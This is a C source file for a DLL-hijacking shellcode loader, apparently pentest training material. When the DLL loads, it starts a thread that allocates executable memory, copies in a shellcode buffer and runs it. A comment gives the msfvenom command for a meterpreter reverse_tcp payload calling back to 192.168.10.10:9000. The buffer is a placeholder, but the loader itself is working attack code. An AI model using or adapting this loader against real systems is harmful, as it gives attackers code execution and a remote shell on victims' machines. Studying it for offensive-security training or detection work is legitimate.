//   Dll Hijacking via Thread Creation 
// Author - Vivek Ramachandran 
//  Learn Pentesting Online --  http://PentesterAcademy.com/topics and http://SecurityTube-Training.com 
// Free Infosec Videos --  http://SecurityTube.net 



#include <windows.h>
#define SHELLCODELEN	1024	


// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.10 LPORT=9000 -f c 

unsigned char shellcode[SHELLCODELEN] = 
"YOUR SHELLCODE";

DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{

	LPVOID newMemory;
	HANDLE currentProcess;
	SIZE_T bytesWritten;
	BOOL didWeCopy = FALSE;

	// Get the current process handle 
	currentProcess = GetCurrentProcess();


	// Allocate memory with Read+Write+Execute permissions 
	newMemory = VirtualAllocEx(currentProcess, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (newMemory == NULL)
		return -1;

	// Copy the shellcode into the memory we just created 
	didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, SHELLCODELEN, &bytesWritten);

	if (!didWeCopy)
		return -2;

	// Yay! Let's run our shellcode! 
	((void(*)())newMemory)();

	return 1;
}




BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

    HANDLE threadHandle;

    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:

		// Create a thread and close the handle as we do not want to use it to wait for it 
		
     	    threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
	    CloseHandle(threadHandle);

            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
    return TRUE;
}


